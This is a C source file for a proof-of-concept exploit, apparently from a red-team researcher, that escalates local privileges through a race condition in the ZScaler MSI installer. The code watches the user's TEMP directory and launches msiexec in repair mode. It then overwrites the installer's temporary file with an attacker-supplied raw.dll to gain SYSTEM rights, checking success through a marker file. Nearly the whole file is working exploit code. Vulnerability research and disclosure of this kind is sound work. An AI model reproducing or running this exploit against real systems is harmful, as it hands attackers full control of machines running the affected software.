#include <windows.h>
#include <winbase.h>
#include <stdlib.h>
#include <stdio.h>
#include <tchar.h>
#include <strsafe.h>
#include <pathcch.h>
#include <Shlwapi.h>
#pragma comment(lib, "Pathcch.lib")
#pragma comment(lib, "Shlwapi.lib")
#include "stdafx.h"


// This is ZScaler installer race condition LPE exploit.
// Developed by Julian Horoszkiewicz (Eviden Red Team).
// Code based on https://learn.microsoft.com/en-us/windows/win32/fileio/obtaining-directory-change-notifications and https://learn.microsoft.com/en-us/windows/win32/fileio/listing-the-files-in-a-directory, FileOplock code taken from Google's https://github.com/googleprojectzero/symboliclink-testing-tools

void RefreshDirectory(LPTSTR);
void RefreshTree(LPTSTR);
void WatchTempDirectory(LPTSTR);
void WatchAndRaceTempFile(LPTSTR);
void deploy_payload(LPTSTR);
HANDLE hFind = INVALID_HANDLE_VALUE;
HANDLE hFind2 = INVALID_HANDLE_VALUE;
HANDLE hFind3 = INVALID_HANDLE_VALUE;
HANDLE hFind4 = INVALID_HANDLE_VALUE;
TCHAR LOCALAPPDATA[MAX_PATH];
TCHAR ZSCALER_TEMP_DIRNAME[MAX_PATH];
TCHAR ZSCALER_TEMP_DIRMASK[MAX_PATH];
TCHAR DLL_PATH[MAX_PATH];
TCHAR DLL_COPY_PATH[MAX_PATH];
TCHAR DLL_DEPLOY_PATH[MAX_PATH];
TCHAR CURRENT_DIR[MAX_PATH];

WIN32_FIND_DATA ffd;
WIN32_FIND_DATA ffd2;
WIN32_FIND_DATA ffd3;
WIN32_FIND_DATA ffd4;
DWORD dwError = 0;
// Find the first file in the directory.
TCHAR FIRST_TEMP_FILENAME[MAX_PATH];
TCHAR FIRST_TEMP_FILEMASK[MAX_PATH];
TCHAR FIRST_OLD_TEMP_FILEMASK[MAX_PATH];
TCHAR OLD_TEMP_FILENAME[MAX_PATH];
TCHAR ZSCALER_MSI_FILE[MAX_PATH];
TCHAR MSIEXEC_COMMAND_LINE[MAX_PATH];
TCHAR TEMP_NAME_BASE[7];
char* DLL_BUFFER;
int FAIL_COUNT = 0;
int THREAD_COUNT = 0;
int MAX_FAILS = 10;
size_t DLL_BUFF_LENGTH = 0;

int remove_old_directory_recurse(LPTSTR path) // this is our cleanup function to recursively remove old temp installer directories
{
    // 1. remove all files from the directory
    StringCchCopy(FIRST_OLD_TEMP_FILEMASK, MAX_PATH, path);
    StringCchCat(FIRST_OLD_TEMP_FILEMASK, MAX_PATH, TEXT("\\BR*")); // this variable is used both for cleanup and for exploitation

    _tprintf(TEXT("Looking for any older %s directories to cleanup before exploitation...\n"), FIRST_OLD_TEMP_FILEMASK);
    hFind2 = FindFirstFile(FIRST_OLD_TEMP_FILEMASK, &ffd2);
    if (INVALID_HANDLE_VALUE == hFind2) // I think this might happen if we get a notification caused by a third-party interference (other directory created, with a different prefix) - take this into account in error handling
    {
        _tprintf(TEXT("\nGot INVALID_HANDLE_VALUE while scanning for %s files to cleanup... \n\n"), ZSCALER_TEMP_DIRMASK);
        return 0; // 0 - failure
    }
    // List all the files in the directory with some info about them.
    do
    {
        if (ffd2.dwFileAttributes) // if it's a directory - which is what we are looking for
        {
            StringCchCopy(OLD_TEMP_FILENAME, MAX_PATH, path);
            StringCchCat(OLD_TEMP_FILENAME, MAX_PATH, TEXT("\\"));
            StringCchCat(OLD_TEMP_FILENAME, MAX_PATH, ffd2.cFileName);
            _tprintf(TEXT("Removing %s... "), OLD_TEMP_FILENAME);
            if (!DeleteFile(OLD_TEMP_FILENAME))
            {
                _tprintf(TEXT("WARNING: could not remove an old ZScaler temp installer file:  %s\nThis can lead to exploit failure! Please consider manually removing all leftovers from previous installations before running this poc!\n"), OLD_TEMP_FILENAME);
                FindClose(hFind2);
                return 0;
            }
            else
            {
                _tprintf(TEXT("done.\n"));
            }
        }
    } while (FindNextFile(hFind2, &ffd2) != 0);
    dwError = GetLastError();
    if (dwError != ERROR_NO_MORE_FILES)
    {
        _tprintf(TEXT("\nERROR %dw while removing an old installer directory %s. This can lead to exploit failure! Please consider manually removing all leftovers from previous installations before running this poc!\n\n"),dwError, path);
        FindClose(hFind2);
        return 0;
    }
    FindClose(hFind2);
    // 2. remove the directory itself (since we removed all underlying files and closed the descriptor, we should be able to do it)
    if (RemoveDirectory(path) != 0)
    {
        return 1; // 1 - success
    }
    _tprintf(TEXT("WARNING: could not remove an old ZScaler temp directory: %s\nThis can lead to exploit failure! Please consider manually removing all leftovers from previous installations before running this poc!\n"), path);
    return 0;
}
void _tmain(int argc, TCHAR* argv[])
{
    if (argc != 2)
    {
        _tprintf(TEXT("\nUsage: %s PATH_TO_ZSCALER_INSTALLER_FILE.msi\n\n"), argv[0]);
        ExitProcess(1);
    }

    if (!PathFileExists(argv[1])) // check if the provided file exists
    {
        _tprintf(TEXT("\nFatal: provided %s MSI file does not exist!\n\n"), argv[1]);
        ExitProcess(1);
    }
    StringCchCopy(ZSCALER_MSI_FILE, MAX_PATH, argv[1]);
    _tprintf(TEXT("\nObtaining the TEMP environmental variable... "));
    GetEnvironmentVariable(TEXT("TEMP"), LOCALAPPDATA, MAX_PATH); // C:\Users\user\AppData\Local\Temp is what we're looking for
    _tprintf(TEXT("Done: "));
    _tprintf(LOCALAPPDATA);
    _tprintf(TEXT("\nPress any key to start the exploitation process... \n"));
//  scanning for the ZScaler temporary installer directory (then run the installer in repair mode in a separate window...
    char g;
    getc(stdin);

    // READ THE raw.dll file into memory
    _tprintf(TEXT("Loading raw.dll into memory...\n"));
    size_t path_len = 0;
    GetModuleFileName(NULL, CURRENT_DIR, MAX_PATH);
    StringCchLengthW(CURRENT_DIR, MAX_PATH, &path_len);
    PathCchRemoveFileSpec(CURRENT_DIR, path_len);
    StringCchCat(DLL_PATH, MAX_PATH, CURRENT_DIR);
    StringCchCat(DLL_PATH, MAX_PATH, TEXT("\\raw.dll"));
    
    HANDLE fileHandle = CreateFile(DLL_PATH, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fileHandle == INVALID_HANDLE_VALUE) {
        _tprintf(TEXT("\nFatal: failed to open %s DLL file for reading!"),DLL_PATH);
        ExitProcess(1);
    }
    // Get the file size
    DLL_BUFF_LENGTH = GetFileSize(fileHandle, NULL);
    // Read the file contents into a buffer
    DLL_BUFFER = new char[DLL_BUFF_LENGTH];
    DWORD bytesRead;
    if (!ReadFile(fileHandle, DLL_BUFFER, DLL_BUFF_LENGTH, &bytesRead, NULL)) {
        _tprintf(TEXT("\nFailed to read the %s DLL file!"),DLL_PATH);
        delete[] DLL_BUFFER;
        CloseHandle(fileHandle);
        ExitProcess(1);
    }
    _tprintf(TEXT("Done (%dw bytes of DLL file read, file size and DLL_BUFFER size: %d).\nStarting to watch for directory changes."), bytesRead, DLL_BUFF_LENGTH);

    // cleanup any leftovers from previous installations
    StringCchCopy(ZSCALER_TEMP_DIRMASK, MAX_PATH, LOCALAPPDATA);
    StringCchCat(ZSCALER_TEMP_DIRMASK, MAX_PATH, TEXT("\\BRL*")); // this variable is used both for cleanup and for exploitation
    DeleteFile(TEXT("C:\\Users\\Public\\poc.txt"));
    _tprintf(TEXT("Looking for any older %s directories to cleanup before exploitation...\n"), ZSCALER_TEMP_DIRMASK);
    hFind = FindFirstFile(ZSCALER_TEMP_DIRMASK, &ffd);
    if (INVALID_HANDLE_VALUE == hFind) // I think this might happen if we get a notification caused by a third-party interference (other directory created, with a different prefix) - take this into account in error handling
    {
        _tprintf(TEXT("\nNo %s directories for cleanup found. Good.\n\n"), ZSCALER_TEMP_DIRMASK);
       // ExitProcess(1);
    }
    else
    {
        do
        {
            if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) // if it's a directory - which is what we are looking for
            {
                StringCchCopy(ZSCALER_TEMP_DIRNAME, MAX_PATH, LOCALAPPDATA);
                StringCchCat(ZSCALER_TEMP_DIRNAME, MAX_PATH, TEXT("\\"));
                StringCchCat(ZSCALER_TEMP_DIRNAME, MAX_PATH, ffd.cFileName);
                _tprintf(TEXT("Old ZScaler temp installer directory name found:  %s\nRemoving...\n"), ZSCALER_TEMP_DIRNAME);
                if (!remove_old_directory_recurse(ZSCALER_TEMP_DIRNAME))
                {
                    _tprintf(TEXT("WARNING: could not remove an old ZScaler temp installer directory:  %s\nThis can lead to exploit failure! Please consider manually removing all leftovers from previous installations before running this poc!\n"), ZSCALER_TEMP_DIRNAME);
                }
            }
        } while (FindNextFile(hFind, &ffd) != 0);
        dwError = GetLastError();
        if (dwError != ERROR_NO_MORE_FILES)
        {
            _tprintf(TEXT("\nError: %dw\n"),dwError);
        }
        FindClose(hFind);
    }
    WatchTempDirectory(LOCALAPPDATA);
}
void start_msiexec()
{
    StringCchCopy(MSIEXEC_COMMAND_LINE, MAX_PATH, TEXT("msiexec.exe /fa "));
    StringCchCat(MSIEXEC_COMMAND_LINE, MAX_PATH, ZSCALER_MSI_FILE);
    _tprintf(TEXT("Starting %s...\n"), MSIEXEC_COMMAND_LINE);
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));


    // Start the child process. 
    if (!CreateProcess(NULL,   // No module name (use command line)
        MSIEXEC_COMMAND_LINE,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
        )
    {
        printf("CreateProcess failed (%d). Exiting!\n", GetLastError());
        ExitProcess(1);
    }
    // We do not wait for the child process to end, we move on towards exploitation.
    // *
    // WaitForSingleObject(pi.hProcess, INFINITE);
    // Close process and thread handles. 
    //CloseHandle(pi.hProcess);
    //CloseHandle(pi.hThread);
    // */
    _tprintf(TEXT("Done...\n"));
}
void WatchTempDirectory(LPTSTR lpDir)
{
   _tprintf(TEXT("Starting to watch %s.\n"),lpDir);
// Watch the subtree for directory creation and deletion. 
// https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstchangenotificationa
   DWORD dwWaitStatus; 
   HANDLE dwChangeHandle; 
   dwChangeHandle = FindFirstChangeNotificationW(lpDir, FALSE, FILE_NOTIFY_CHANGE_DIR_NAME); // watch file name changes

   if(dwChangeHandle == INVALID_HANDLE_VALUE) 
   {
     printf("\n ERROR: FindFirstChangeNotification function failed.\n");
     ExitProcess(GetLastError()); 
   }
   if(dwChangeHandle == NULL)
   {
     printf("\n ERROR: Unexpected NULL from FindFirstChangeNotification.\n");
     ExitProcess(GetLastError()); 
   }
   _tprintf(TEXT("\nDIR being watched: %s\n"), lpDir);
   //printf("\nStarting f filesystem notification...\n");
   start_msiexec(); // STARTING MSIEXEC PROCESS
   while (TRUE) 
   { 
      // Wait for notification.
      dwWaitStatus = WaitForSingleObject(dwChangeHandle, INFINITE);
      //printf("Got some!\n");
      //_tprintf(TEXT("Looking for %s directory...\n"), ZSCALER_TEMP_DIRMASK);
      switch (dwWaitStatus) 
      { 
         case WAIT_OBJECT_0: 
             //printf("A directory was created, renamed, or deleted.\n"); // OK, this is working, so far so good!
             // now, check if it appears to be a ZScaler temp directory (based on the prefix), and if so - dive into watching it - or maybe even scan it for files already without waiting for further notifications (if our first approach fails, we will attempt to remove the directory already at this stage)
             hFind3 = FindFirstFile(ZSCALER_TEMP_DIRMASK, &ffd3);
             if (INVALID_HANDLE_VALUE == hFind) // I think this might happen if we get a notification caused by a third-party interference (other directory created, with a different prefix) - take this into account in error handling
             {
                printf("\nError: INVALID_HANDLE_VALUE (continuing)...\n\n");
                continue;
             }
             // List all the files in the directory with some info about them.
            do
            {
                if (ffd3.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) // if it's a directory - which is what we want
                {
                    StringCchCopy(ZSCALER_TEMP_DIRNAME, MAX_PATH, LOCALAPPDATA);
                    StringCchCat(ZSCALER_TEMP_DIRNAME, MAX_PATH, TEXT("\\"));
                    StringCchCat(ZSCALER_TEMP_DIRNAME, MAX_PATH, ffd3.cFileName);
                    //_tprintf(TEXT("ZScaler temp installer directory name found:  %s\nLet's dance.\n"), ZSCALER_TEMP_DIRNAME);
                    WatchAndRaceTempFile(ZSCALER_TEMP_DIRNAME);
                    // at this point we can already scan for the first file and start our race
                    return;
                }
            } while (FindNextFile(hFind3, &ffd3) != 0);
            dwError = GetLastError();
            if (dwError != ERROR_NO_MORE_FILES)
            {
                _tprintf(TEXT("\nERROR_NO_MORE_FILES\n\n"));
            }
            FindClose(hFind3);
            //WatchZscalerTempDirectory(lpDrive);
            printf("Exiting.\n");
            ExitProcess(dwError); //
            break; 
         case WAIT_TIMEOUT:
         // A timeout occurred, this would happen if some value other 
         // than INFINITE is used in the Wait call and no changes occur.
         // In a single-threaded environment you might not want an
         // INFINITE wait.
            printf("\nNo changes in the timeout period (this should not happen, as we passed INIFINITE to WaitForSingleObject().\n");
            break;
         default: 
            printf("\n ERROR: Unhandled dwWaitStatus.\n");
            ExitProcess(GetLastError());
            break;
      }
   }
}

void WatchAndRaceTempFile(LPTSTR lpDir)
{
    StringCchCopy(FIRST_TEMP_FILEMASK, MAX_PATH, lpDir);
    StringCchCat(FIRST_TEMP_FILEMASK, MAX_PATH, TEXT("\\BR*"));
    while(TRUE) // now, we want an inifinite loop to search for this first file - the reason being, if we don't, we will end up not finding the file as our code manages to check the directory for the first time before the first file is even created - this is because we start the search in the directory without waiting for a notification
    {
        hFind4 = FindFirstFile(FIRST_TEMP_FILEMASK,&ffd4);
        if (INVALID_HANDLE_VALUE == hFind4)
        {
            //_tprintf(TEXT("\nINVALID_HANDLE_VALUE while searching for %s\n\n"),FIRST_TEMP_FILEMASK);
            continue;
        }
        // now, this is where we should start new threads, one per each temp file, to increase the odds of winning the race
        StringCchCopy(FIRST_TEMP_FILENAME, MAX_PATH, ffd4.cFileName);
        //_tprintf(TEXT("\nFirst name obtained: %s\n"),ffd4.cFileName);

        StringCchCopy(DLL_DEPLOY_PATH,MAX_PATH, ZSCALER_TEMP_DIRNAME);
        StringCchCat(DLL_DEPLOY_PATH, MAX_PATH, TEXT("\\"));
        StringCchCat(DLL_DEPLOY_PATH, MAX_PATH, ffd4.cFileName);
        deploy_payload(DLL_DEPLOY_PATH); // now we have the full path, we can deploy
        break;
    }
    return;
}
void deploy_payload(LPTSTR target_filename) // second version, let's try writing into it, hopefully this will be faster than trying to replace the file instead...
{
    _tprintf(TEXT("Attacking %s (using printf instead of sleep to introduce a slight delay to avoid winning the race too early)..."),target_filename);
    while(FAIL_COUNT<MAX_FAILS)
    {
        HANDLE outFile = CreateFile(target_filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(outFile == INVALID_HANDLE_VALUE)
        {
            FAIL_COUNT++;
            _tprintf(TEXT("\nFailed to overwrite the %s file (%d attempt)!"),target_filename,FAIL_COUNT);
            continue;
        }
        // Write binary data to the file
        DWORD bytesWritten;
        if(!WriteFile(outFile, DLL_BUFFER, DLL_BUFF_LENGTH, &bytesWritten, NULL)) 
        {
            _tprintf(TEXT("\nFailed to write into %s file!"),target_filename);
        }
        else
        {
            CloseHandle(outFile);
            printf("\nFile overwritten (%d bytes written)! Hopefully at the right moment!\n", bytesWritten);
            // we could add a routine checking for C:\Users\Public\poc.txt here
            Sleep(1000);
            if (PathFileExists(TEXT("C:\\Users\\Public\\poc.txt")))
            {
                printf("\n\nGOT SYSTEM BABY!!! C:\\Users\\Public\\poc.txt was created!\n\n");
                
            }
            else
            {
                printf("We must have won the condition too early! Wait until installer finishes and try again!\n");
            }
            ExitProcess(0); // exit all threads, we're done here - if we failed to get SYSTEM after first overwrite, we have failed and there is no reason to try again
        }
    }
}